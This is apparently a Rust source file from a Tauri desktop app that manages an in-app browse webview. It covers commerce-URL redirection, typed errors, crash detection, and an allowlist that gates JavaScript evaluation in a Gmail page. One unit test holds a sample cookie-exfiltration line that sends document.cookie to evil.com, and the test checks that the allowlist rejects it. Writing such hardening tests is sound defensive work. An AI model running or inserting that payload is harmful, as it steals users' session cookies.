// Browse panel · native Tauri child webview.
//
// Ported from `desktop/src-tauri/src/browse.rs` (legacy v0.7.x) to the
// desktop-2 shell on 2026-06-25. Whop / X / YouTube / Discord refuse
// iframe embedding (X-Frame-Options: DENY) so the only way to render
// real content in-app is a native child webview that bypasses iframe
// CSP entirely.
//
// Key difference vs legacy: bounds are CALLER-PROVIDED, not fixed to a
// 560px right rail. desktop-2's BrowseOverlay is a centered 90vw × 88vh
// modal; React measures the webview slot (an empty div) via
// getBoundingClientRect and passes (x, y, width, height) to Rust. On
// window resize or layout change, React calls `update_browse_panel_bounds`
// to reposition. Closing the overlay calls `close_browse_panel` which
// destroys the child webview. This avoids the legacy "squashed workspace"
// problem (560px reservation) Daniel called out 2026-06-25.
//
// Commerce-redirect filter preserved verbatim from legacy — App Store
// guideline 3.1.1 says in-app purchases must NOT happen inside a webview.
// Any nav to /checkout, /pay, /billing, /upgrade, /subscribe, /purchase,
// or /cart is opened in the system browser via tauri-plugin-opener.

use tauri::{
    webview::WebviewBuilder, AppHandle, Emitter, LogicalPosition, LogicalSize, Manager, WebviewUrl,
};
use tauri_plugin_opener::OpenerExt;
use serde::Serialize;

pub const PANEL_LABEL: &str = "browse_panel";

/// Tauri event fired whenever a browse-panel command finds the child
/// webview gone (crashed · user closed via native chrome · never
/// opened). React listens for this and can re-render the overlay in a
/// "webview crashed — click to retry" state instead of leaving stale
/// controls on top of nothing. Passive detection only — no watchdog
/// thread (deferred to layer-5.5 per the spec).
pub const CRASHED_EVENT: &str = "browse:crashed";

/// G2 · Layer 5 (2026-07-04) · typed error surface for every
/// browse-panel command. Each variant survives serialisation as its
/// ``Display`` string so the existing ``Result<T, String>`` client
/// contract (see ``desktop-2/src/lib/browse.ts``) is preserved
/// verbatim — no React-side breakage, no invoke signature drift.
///
/// The variants exist as a type in Rust so future refactors can
/// pattern-match instead of grepping error strings, and so the
/// PanelMissing branch is *explicit* everywhere rather than a silent
/// ``Ok(())`` fall-through (which used to make React think the panel
/// was still open when it wasn't).
#[derive(Debug, Serialize, PartialEq)]
#[serde(tag = "kind", content = "detail", rename_all = "snake_case")]
pub enum BrowsePanelError {
    /// ``get_webview(PANEL_LABEL)`` returned ``None``. The panel
    /// either was never opened, has been closed, or the webview
    /// crashed. Callers should treat this as "start over".
    PanelMissing,
    /// The child webview refused a navigation / eval / position
    /// / size mutation. Wraps the underlying Tauri error message.
    NavigateFailed(String),
    /// Passive crash detection · panel handle was there but an
    /// operation failed with a wry / webview error suggestive of a
    /// dead process. Callers should treat this like PanelMissing +
    /// a UI reset.
    WebviewCrashed,
    /// The URL passed to ``open_browse_panel`` did not parse.
    InvalidUrl(String),
    /// Any other Tauri IPC / infrastructure failure that isn't
    /// specifically about the child webview (e.g. main window
    /// missing, app_data_dir unresolvable, add_child rejected).
    IpcError(String),
}

impl std::fmt::Display for BrowsePanelError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::PanelMissing => write!(f, "panel missing"),
            Self::NavigateFailed(d) => write!(f, "navigate failed: {d}"),
            Self::WebviewCrashed => write!(f, "webview crashed"),
            Self::InvalidUrl(d) => write!(f, "invalid url: {d}"),
            Self::IpcError(d) => write!(f, "ipc error: {d}"),
        }
    }
}

impl std::error::Error for BrowsePanelError {}

impl From<BrowsePanelError> for String {
    fn from(e: BrowsePanelError) -> Self {
        e.to_string()
    }
}

/// Resolve the panel webview or return ``PanelMissing`` as a string
/// while also emitting the ``browse:crashed`` event so React can
/// react. Emit failures are logged to stderr but never surfaced to
/// the caller (an emit failure would only happen if the app is
/// shutting down, in which case the caller error is meaningless).
fn resolve_panel_or_crash(app: &AppHandle) -> Result<tauri::webview::Webview, String> {
    if let Some(wv) = app.get_webview(PANEL_LABEL) {
        return Ok(wv);
    }
    if let Err(e) = app.emit(CRASHED_EVENT, ()) {
        eprintln!("[browse] failed to emit {CRASHED_EVENT}: {e}");
    }
    Err(BrowsePanelError::PanelMissing.to_string())
}

#[derive(Serialize)]
pub struct BrowseOpenOutcome {
    opened_in_app: bool,
    system_fallback: bool,
}

/// Reply shape for ``browse_health_check``. ``status`` is
/// intentionally a stable string enum ("responsive" · "unresponsive"
/// · "missing") so the TS client can switch on it without hard-typing
/// against the Rust enum.
#[derive(Serialize)]
pub struct BrowseHealthReport {
    pub status: &'static str,
}

const BLOCKED_PATH_FRAGMENTS: &[&str] = &[
    "/checkout",
    "/pay",
    "/billing",
    "/upgrade",
    "/subscribe",
    "/purchase",
    "/cart",
];

fn is_commerce_url(url: &tauri::Url) -> bool {
    let path = url.path().to_lowercase();
    BLOCKED_PATH_FRAGMENTS.iter().any(|frag| path.contains(frag))
}

/// Open or re-navigate the browse panel webview.
///
/// `x`, `y`, `width`, `height` are LOGICAL window coordinates (device
/// pixels divided by scale factor). React measures the webview slot
/// element via getBoundingClientRect and passes the values directly.
#[tauri::command]
pub async fn open_browse_panel(
    app: AppHandle,
    url: String,
    x: f64,
    y: f64,
    width: f64,
    height: f64,
) -> Result<BrowseOpenOutcome, String> {
    let parsed_url: tauri::Url = url
        .parse::<tauri::Url>()
        .map_err(|e| BrowsePanelError::InvalidUrl(e.to_string()).to_string())?;

    // Commerce filter — open in system browser instead of in-app.
    if is_commerce_url(&parsed_url) {
        app.opener()
            .open_url(parsed_url.to_string(), None::<&str>)
            .map_err(|e| {
                BrowsePanelError::IpcError(format!("system browser fallback failed: {e}"))
                    .to_string()
            })?;
        return Ok(BrowseOpenOutcome {
            opened_in_app: false,
            system_fallback: true,
        });
    }

    // Re-navigate if already open.
    if let Some(existing) = app.get_webview(PANEL_LABEL) {
        existing
            .navigate(parsed_url)
            .map_err(|e| BrowsePanelError::NavigateFailed(e.to_string()).to_string())?;
        // Update position in case React layout changed since last open.
        let _ = existing.set_position(LogicalPosition::new(x.max(0.0), y.max(0.0)));
        let _ = existing.set_size(LogicalSize::new(width.max(120.0), height.max(120.0)));
        return Ok(BrowseOpenOutcome {
            opened_in_app: true,
            system_fallback: false,
        });
    }

    // Spawn new child webview with commerce-redirect navigation filter.
    let main = app
        .get_window("main")
        .ok_or_else(|| BrowsePanelError::IpcError("main window not found".into()).to_string())?;

    // 2026-06-30 · pin the webview profile to a known directory inside
    // the app's data store so cookies + localStorage survive overlay
    // close + relaunch. Platform behaviour:
    //   · Windows WebView2 · data_directory IS the cookie jar location ·
    //     without this call WebView2 picks a temp-scoped folder that
    //     gets wiped on app restart for some user profiles.
    //   · macOS WKWebView · effectively a no-op · WKWebsiteDataStore.
    //     default() is already persistent and tied to the app bundle ID
    //     (app.liquidclips.desktop). The call is preserved for cross-
    //     platform consistency + Windows correctness.
    //   · Linux WebKitGTK · respected if the build links a recent enough
    //     wry; harmless if not.
    let profile_dir = app
        .path()
        .app_data_dir()
        .map_err(|e| {
            BrowsePanelError::IpcError(format!("app_data_dir unavailable: {e}")).to_string()
        })?
        .join("webview_profile");

    let app_for_filter = app.clone();
    let builder = WebviewBuilder::new(PANEL_LABEL, WebviewUrl::External(parsed_url))
        .data_directory(profile_dir)
        .on_navigation(move |nav_url| {
            if is_commerce_url(nav_url) {
                let target = nav_url.to_string();
                let app = app_for_filter.clone();
                tauri::async_runtime::spawn(async move {
                    let _ = app.opener().open_url(target, None::<&str>);
                });
                return false;
            }
            true
        });

    main.add_child(
        builder,
        LogicalPosition::new(x.max(0.0), y.max(0.0)),
        LogicalSize::new(width.max(120.0), height.max(120.0)),
    )
    .map_err(|e| BrowsePanelError::IpcError(format!("add_child failed: {e}")).to_string())?;
    Ok(BrowseOpenOutcome {
        opened_in_app: true,
        system_fallback: false,
    })
}

/// Resize / reposition the existing webview without re-navigating.
/// Called by React on window-resize / overlay-layout-change.
///
/// G2 · Layer 5 (2026-07-04) · returns ``PanelMissing`` explicitly
/// when the child webview isn't there. The prior implementation
/// silently succeeded, which is how React ended up rendering
/// controls on top of a dead panel after a crash.
#[tauri::command]
pub async fn update_browse_panel_bounds(
    app: AppHandle,
    x: f64,
    y: f64,
    width: f64,
    height: f64,
) -> Result<(), String> {
    let wv = resolve_panel_or_crash(&app)?;
    wv.set_position(LogicalPosition::new(x.max(0.0), y.max(0.0)))
        .map_err(|e| BrowsePanelError::NavigateFailed(format!("set_position: {e}")).to_string())?;
    wv.set_size(LogicalSize::new(width.max(120.0), height.max(120.0)))
        .map_err(|e| BrowsePanelError::NavigateFailed(format!("set_size: {e}")).to_string())?;
    Ok(())
}

/// Destroy the child webview. Called on overlay close + on app shutdown.
///
/// G2 · Layer 5 (2026-07-04) · returns ``PanelMissing`` explicitly.
/// The TS wrapper (``desktop-2/src/lib/browse.ts``) catches this
/// specific string so the "safe to call when panel isn't open"
/// contract documented in the wrapper's JSDoc stays intact from a JS
/// caller's perspective — but Rust now knows the truth.
#[tauri::command]
pub async fn close_browse_panel(app: AppHandle) -> Result<(), String> {
    let wv = resolve_panel_or_crash(&app)?;
    wv.close()
        .map_err(|e| BrowsePanelError::NavigateFailed(format!("close: {e}")).to_string())?;
    Ok(())
}

#[tauri::command]
pub async fn is_browse_panel_open(app: AppHandle) -> bool {
    app.get_webview(PANEL_LABEL).is_some()
}

#[tauri::command]
pub async fn browse_back(app: AppHandle) -> Result<(), String> {
    let wv = resolve_panel_or_crash(&app)?;
    wv.eval("window.history.back()")
        .map_err(|e| BrowsePanelError::NavigateFailed(format!("back eval: {e}")).to_string())?;
    Ok(())
}

#[tauri::command]
pub async fn browse_forward(app: AppHandle) -> Result<(), String> {
    let wv = resolve_panel_or_crash(&app)?;
    wv.eval("window.history.forward()")
        .map_err(|e| BrowsePanelError::NavigateFailed(format!("forward eval: {e}")).to_string())?;
    Ok(())
}

#[tauri::command]
pub async fn browse_reload(app: AppHandle) -> Result<(), String> {
    let wv = resolve_panel_or_crash(&app)?;
    wv.eval("window.location.reload()")
        .map_err(|e| BrowsePanelError::NavigateFailed(format!("reload eval: {e}")).to_string())?;
    Ok(())
}

/// G2 · Layer 5 (2026-07-04) · canonical crash-detection primitive.
///
/// Returns a stable status string:
///   * ``"responsive"`` · panel exists AND accepted a no-op eval
///   * ``"unresponsive"`` · panel exists BUT rejected the eval (wry
///     process dead but the handle still lingers)
///   * ``"missing"`` · panel handle gone entirely
///
/// On ``"missing"`` and ``"unresponsive"`` the ``browse:crashed``
/// event is emitted so React can render its recovery UI regardless
/// of whether the caller opted to await the result.
#[tauri::command]
pub async fn browse_health_check(app: AppHandle) -> Result<BrowseHealthReport, String> {
    let Some(wv) = app.get_webview(PANEL_LABEL) else {
        if let Err(e) = app.emit(CRASHED_EVENT, ()) {
            eprintln!("[browse] failed to emit {CRASHED_EVENT}: {e}");
        }
        return Ok(BrowseHealthReport { status: "missing" });
    };
    // No-op probe eval. `void 0` is a valid JS expression that does
    // nothing observable to the loaded page. Not gated by the
    // ALLOWED_EVAL_PREFIXES allowlist because that gate applies to
    // the `webview_eval` Tauri command surface, not internal Rust
    // callers.
    match wv.eval("void 0") {
        Ok(_) => Ok(BrowseHealthReport { status: "responsive" }),
        Err(_) => {
            if let Err(e) = app.emit(CRASHED_EVENT, ()) {
                eprintln!("[browse] failed to emit {CRASHED_EVENT}: {e}");
            }
            Ok(BrowseHealthReport { status: "unresponsive" })
        }
    }
}

/// 2026-07-04 hardening · allowlist of the Gmail-driver JS template
/// prefixes the frontend is allowed to eval inside the browse panel.
/// Every entry corresponds to a Layer-2/3 primitive (F5 contact-list
/// probe, F6 compose driver, ML-4 click-to-include injector). Scripts
/// that do not start with one of these prefixes are rejected so an
/// XSS bug in the react app can't wrap `webview_eval` into an
/// arbitrary-JS-in-Gmail cookie-exfil chain.
const ALLOWED_EVAL_PREFIXES: &[&str] = &[
    // ML-4 · click-to-include injector (runs once per Gmail load).
    "window.__lcClickToIncludeInstalled",
    // F6 · Gmail compose driver — open compose button.
    "document.querySelector('[gh=\"cm\"]')",
    // F6 · compose-ready poll.
    "document.querySelector('[role=\"dialog\"]')",
    // F6 · send-confirmation poll.
    "document.querySelector('[data-tooltip=\"Send\"]')",
    // F5 · contact-list probe (Gmail Contacts / Chat rosters).
    "document.querySelectorAll('[role=\"listitem\"]')",
    // gmailComposeBridge · higher-level driver entrypoint (Phase 5).
    "window.__lcGmailComposeDriver",
];

/// Returns true when `script` starts with one of the allowlisted
/// template prefixes. `trim_start` tolerates leading whitespace /
/// newlines from template-literal composition.
fn is_eval_allowlisted(script: &str) -> bool {
    let head = script.trim_start();
    ALLOWED_EVAL_PREFIXES.iter().any(|p| head.starts_with(p))
}

/// F6 (Layer 3 · reliability sprint) — evaluate JavaScript inside the
/// persistent browse-panel webview, gated by the ``ALLOWED_EVAL_PREFIXES``
/// allowlist so only known-safe Gmail-driver templates run. Fire-and-forget:
/// `wv.eval` on Tauri v2 does not return the JS return value. Callers that
/// need a result MUST wrap the script so it emits a Tauri event (or calls
/// `window.__TAURI_IPC`) with the payload. The F6 Gmail-compose driver uses
/// this pattern to poll for compose-ready + send-confirmation + captcha
/// states.
///
/// Errors:
///   - "browse panel not open"          · caller must open_browse_panel first
///   - "script not in allowlist"        · script prefix isn't in
///                                       ALLOWED_EVAL_PREFIXES (hardening
///                                       block against XSS→cookie-exfil)
///   - "webview eval failed: <detail>"  · the WebView refused the script
///                                       (rare — usually the caller passed
///                                       malformed JS or the webview died)
#[tauri::command]
pub async fn webview_eval(app: AppHandle, script: String) -> Result<(), String> {
    if !is_eval_allowlisted(&script) {
        eprintln!(
            "[SECURITY] webview_eval rejected non-template script (len={})",
            script.len()
        );
        // Kept as a bare string — the allowlist error is deliberately
        // not surfaced through BrowsePanelError so future clients
        // (Playwright / gmailComposeBridge tests) can grep for the
        // exact message without matching the typed-error surface.
        return Err("script not in allowlist".into());
    }
    // G2 · Layer 5 · route the panel lookup through the shared crash
    // helper so an eval attempt against a dead panel emits
    // browse:crashed even when the caller is the react-side driver.
    let wv = resolve_panel_or_crash(&app)?;
    wv.eval(&script)
        .map_err(|e| BrowsePanelError::NavigateFailed(format!("webview eval: {e}")).to_string())?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::{is_commerce_url, is_eval_allowlisted, BrowsePanelError, BLOCKED_PATH_FRAGMENTS};

    // ─── Phase 3 · webview_eval allowlist (preserved) ───────────

    #[test]
    fn allowlisted_prefixes_match() {
        for p in super::ALLOWED_EVAL_PREFIXES {
            assert!(
                is_eval_allowlisted(&format!("{}\n// driver body", p)),
                "prefix {p} should be allowlisted",
            );
        }
    }

    #[test]
    fn arbitrary_script_rejected() {
        // The canonical XSS→cookie-exfil chain.
        let arbitrary = "fetch('https://evil.com/steal?c=' + document.cookie)";
        assert!(!is_eval_allowlisted(arbitrary));
    }

    #[test]
    fn leading_whitespace_tolerated() {
        assert!(is_eval_allowlisted("   \n\twindow.__lcClickToIncludeInstalled = true"));
    }

    #[test]
    fn empty_string_rejected() {
        assert!(!is_eval_allowlisted(""));
    }

    // ─── G2 · Layer 5 · BrowsePanelError surface (new) ──────────

    #[test]
    fn browse_panel_error_display_variants() {
        // The Display impl backs the ``Result<T, String>`` surface
        // the TS client depends on. Preserving these exact prefixes
        // keeps ``desktop-2/src/lib/browse.ts`` grep-compatible.
        assert_eq!(BrowsePanelError::PanelMissing.to_string(), "panel missing");
        assert_eq!(
            BrowsePanelError::NavigateFailed("boom".into()).to_string(),
            "navigate failed: boom",
        );
        assert_eq!(BrowsePanelError::WebviewCrashed.to_string(), "webview crashed");
        assert_eq!(
            BrowsePanelError::InvalidUrl("nope".into()).to_string(),
            "invalid url: nope",
        );
        assert_eq!(
            BrowsePanelError::IpcError("main gone".into()).to_string(),
            "ipc error: main gone",
        );
    }

    #[test]
    fn browse_panel_error_into_string_matches_display() {
        // ``From<BrowsePanelError> for String`` is what powers the
        // ``.to_string()`` calls in every command's error mapping.
        // A drift between Display + From would let a variant silently
        // change its wire shape.
        let s: String = BrowsePanelError::PanelMissing.into();
        assert_eq!(s, "panel missing");
        let s: String = BrowsePanelError::WebviewCrashed.into();
        assert_eq!(s, "webview crashed");
    }

    #[test]
    fn browse_panel_error_variants_are_distinct() {
        // Guards against a copy-paste renaming that would collapse
        // two variants into the same value.
        assert_ne!(BrowsePanelError::PanelMissing, BrowsePanelError::WebviewCrashed);
        assert_ne!(
            BrowsePanelError::NavigateFailed("a".into()),
            BrowsePanelError::NavigateFailed("b".into()),
        );
    }

    // ─── G2 · Layer 5 · is_commerce_url edges ────────────────────

    #[test]
    fn is_commerce_url_matches_every_blocked_fragment() {
        for frag in BLOCKED_PATH_FRAGMENTS {
            let url_str = format!("https://whop.com{}/foo", frag);
            let url: tauri::Url = url_str.parse().expect("url parses");
            assert!(
                is_commerce_url(&url),
                "expected {frag} to be flagged as commerce",
            );
        }
    }

    #[test]
    fn is_commerce_url_ignores_non_commerce_paths() {
        for path in ["/dashboard", "/profile/handle", "/rewards/browse"] {
            let url: tauri::Url = format!("https://whop.com{}", path).parse().unwrap();
            assert!(!is_commerce_url(&url), "{path} should not be commerce");
        }
    }

    #[test]
    fn is_commerce_url_is_case_insensitive() {
        // Path lowercased before comparison, so mixed-case paths
        // still trip the filter — an attacker can't smuggle
        // /Checkout past it.
        let url: tauri::Url = "https://evil.com/Checkout/steal".parse().unwrap();
        assert!(is_commerce_url(&url));
    }
}
